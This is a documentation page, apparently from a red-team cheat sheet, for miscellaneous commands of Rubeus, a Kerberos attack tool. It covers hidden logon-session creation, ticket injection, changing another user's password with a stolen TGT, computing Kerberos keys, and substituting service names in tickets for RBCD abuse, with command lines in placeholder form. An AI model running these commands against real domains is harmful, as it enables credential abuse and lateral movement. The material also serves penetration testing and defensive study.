{"title": "Miscellaneous Commands", "source": "rubeus", "source_label": "Rubeus", "path": "misc", "html": "<h1 id=\"miscellaneous-commands\">Miscellaneous Commands</h1>\n<p>Utility commands: process creation, password change, hash calculation, ticket manipulation.</p>\n<hr>\n<h2 id=\"createnetonly\">createnetonly</h2>\n<p>Create a hidden process with LOGON_TYPE 9 (NewCredentials / runas /netonly). Used to create a sacrificial logon session for applying tickets without clobbering the current session.</p>\n<h3 id=\"usage\">Usage</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe createnetonly /program:&quot;&lt;exe-path&gt;&quot; [/show] [/ticket:&lt;ticket&gt; | /ticket:&lt;file&gt;.kirbi]\n</code></pre></div>\n<h3 id=\"options\">Options</h3>\n<ul>\n<li><code>/program:\"&lt;exe-path&gt;\"</code> — path to executable to launch</li>\n<li><code>/show</code> — display the created process window (default: hidden)</li>\n<li><code>/ticket:&lt;ticket&gt;</code> — inject ticket into the new process immediately</li>\n</ul>\n<h3 id=\"examples\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code># Create hidden process\nRubeus.exe createnetonly /program:&quot;C:\\Windows\\System32\\cmd.exe&quot;\n\n# Create visible cmd.exe\nRubeus.exe createnetonly /program:&quot;C:\\Windows\\System32\\cmd.exe&quot; /show\n\n# Create and inject ticket\nRubeus.exe createnetonly /program:&quot;C:\\Windows\\System32\\cmd.exe&quot; /show /ticket:&lt;ticket&gt;.kirbi\n\n# Then apply another ticket to that LUID (elevated)\nRubeus.exe ptt /luid:0x4a091c0 /ticket:&lt;ticket&gt;\n</code></pre></div>\n<hr>\n<h2 id=\"changepw\">changepw</h2>\n<p>Reset a user's Kerberos password using an existing TGT (Aorato technique / MS kpasswd). Equivalent to Kekeo's <code>misc::changepw</code>.</p>\n<h3 id=\"usage_1\">Usage</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe changepw &lt;/ticket:&lt;ticket&gt; | /ticket:&lt;file&gt;.kirbi&gt; /new:&lt;new-password&gt; [/dc:&lt;dc-ip&gt;] [/targetuser:&lt;domain&gt;\\&lt;username&gt;]\n</code></pre></div>\n<h3 id=\"options_1\">Options</h3>\n<ul>\n<li><code>/ticket:&lt;ticket&gt;</code> — TGT or kadmin/changepw service ticket</li>\n<li><code>/new:&lt;new-password&gt;</code> — new password to set</li>\n<li><code>/dc:&lt;dc-ip&gt;</code> — domain controller (port 464)</li>\n<li><code>/targetuser:&lt;domain&gt;\\&lt;username&gt;</code> — change another user's password (requires sufficient privileges)</li>\n</ul>\n<h3 id=\"examples_1\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code># Change own password\nRubeus.exe changepw /ticket:&lt;ticket&gt; /new:&lt;new-password&gt;\n\n# Change another user&#39;s password\nRubeus.exe changepw /ticket:&lt;ticket&gt; /new:&lt;new-password&gt; /targetuser:&lt;domain&gt;\\&lt;username&gt;\n\n# First get a TGT\nRubeus.exe asktgt /user:&lt;username&gt; /password:&lt;password&gt; /changepw\n</code></pre></div>\n<hr>\n<h2 id=\"hash\">hash</h2>\n<p>Calculate Kerberos encryption keys (rc4_hmac, aes128, aes256, des_cbc_md5) from a plaintext password.</p>\n<h3 id=\"usage_2\">Usage</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe hash /password:&lt;password&gt; [/user:&lt;username&gt;] [/domain:&lt;domain&gt;]\n</code></pre></div>\n<h3 id=\"options_2\">Options</h3>\n<ul>\n<li><code>/password:&lt;password&gt;</code> — plaintext password to hash</li>\n<li><code>/user:&lt;username&gt;</code> — username (required for AES/DES — used as salt)</li>\n<li><code>/domain:&lt;domain&gt;</code> — domain (required for AES/DES — used as salt)</li>\n</ul>\n<h3 id=\"examples_2\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code># RC4/NTLM only\nRubeus.exe hash /password:&lt;password&gt;\n\n# All hash types (AES requires user+domain for salt)\nRubeus.exe hash /password:&lt;password&gt; /user:&lt;username&gt; /domain:&lt;domain&gt;\n</code></pre></div>\n<hr>\n<h2 id=\"tgssub\">tgssub</h2>\n<p>Substitute an alternate service name (sname) into an existing service ticket. Exploits the fact that the sname field in a KRB-CRED is not protected by signature, only the server name is.</p>\n<h3 id=\"usage_3\">Usage</h3>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe tgssub &lt;/ticket:&lt;ticket&gt; | /ticket:&lt;file&gt;.kirbi&gt; /altservice:&lt;spn&gt; [/srealm:&lt;domain&gt;] [/ptt] [/luid] [/nowrap]\n</code></pre></div>\n<h3 id=\"options_3\">Options</h3>\n<ul>\n<li><code>/ticket:&lt;ticket&gt;</code> — source service ticket (base64 or .kirbi)</li>\n<li><code>/altservice:&lt;spn&gt;</code> — replacement service name:</li>\n<li>Standalone sname: <code>cifs</code>, <code>ldap</code>, <code>host</code></li>\n<li>Full SPN: <code>cifs/&lt;computer&gt;.&lt;domain&gt;</code></li>\n<li><code>/srealm:&lt;domain&gt;</code> — optional: change the service realm</li>\n<li><code>/ptt</code> — inject resulting ticket</li>\n<li><code>/luid</code> — apply to specific LUID (elevated)</li>\n<li><code>/nowrap</code> — don't line-wrap</li>\n</ul>\n<h3 id=\"examples_3\">Examples</h3>\n<div class=\"highlight\"><pre><span></span><code># Substitute cifs for ldap in a service ticket\nRubeus.exe tgssub /ticket:&lt;ticket&gt; /altservice:cifs /ptt\n\n# Full SPN substitution (RBCD abuse)\nRubeus.exe tgssub /ticket:&lt;ticket&gt; /altservice:cifs/&lt;computer&gt;.&lt;domain&gt; /ptt\n</code></pre></div>\n<hr>\n<h2 id=\"currentluid\">currentluid</h2>\n<p>Display the current user's logon ID (LUID).</p>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe currentluid\n</code></pre></div>\n<hr>\n<h2 id=\"logonsession\">logonsession</h2>\n<p>Display information about the current logon session (or all sessions if elevated).</p>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe logonsession [/current] [/luid:&lt;luid&gt;]\n</code></pre></div>\n<hr>\n<h2 id=\"asrep2kirbi\">asrep2kirbi</h2>\n<p>Convert an AS-REP and a client session key into a usable Kirbi (KRB-CRED).</p>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe asrep2kirbi /asrep:&lt;base64-or-filepath&gt; &lt;/key:&lt;base64-key&gt; | /keyhex:&lt;hex-string&gt;&gt; [/enctype:DES|RC4|AES128|AES256] [/ptt] [/luid:&lt;luid&gt;] [/nowrap]\n</code></pre></div>\n<hr>\n<h2 id=\"kirbi\">kirbi</h2>\n<p>Manipulate Kirbi files — currently supports inserting/replacing the session key.</p>\n<div class=\"highlight\"><pre><span></span><code>Rubeus.exe kirbi /kirbi:&lt;base64-or-filepath&gt; /sessionkey:&lt;session-key&gt; /sessionetype:DES|RC4|AES128|AES256 [/ptt] [/luid:&lt;luid&gt;] [/outfile:&lt;output&gt;] [/nowrap]\n</code></pre></div>\n<hr>\n<h2 id=\"global-flags\">Global Flags</h2>\n<p>These flags apply to all commands:</p>\n<ul>\n<li><code>/nowrap</code> — prevent base64 output from being line-wrapped</li>\n<li><code>/consoleoutfile:C:\\output.txt</code> — redirect all console output to file</li>\n<li><code>/debug</code> — output ASN.1 debugging information</li>\n</ul>\n<h2 id=\"decode-base64-ticket\">Decode Base64 Ticket</h2>\n<div class=\"highlight\"><pre><span></span><code><span class=\"no\">[IO.File]</span><span class=\"p\">::</span><span class=\"n\">WriteAllBytes</span><span class=\"p\">(</span><span class=\"s2\">&quot;ticket.kirbi&quot;</span><span class=\"p\">,</span> <span class=\"no\">[Convert]</span><span class=\"p\">::</span><span class=\"n\">FromBase64String</span><span class=\"p\">(</span><span class=\"s2\">&quot;&lt;base64-blob&gt;&quot;</span><span class=\"p\">))</span>\n</code></pre></div>", "excerpt": "Miscellaneous Commands Utility commands: process creation, password change, hash calculation, ticket manipulation. createnetonly Create a hidden process with LOGON_TYPE 9 (NewCredentials / runas /netonly). Used to create a sacrificial logon session…", "tags": []}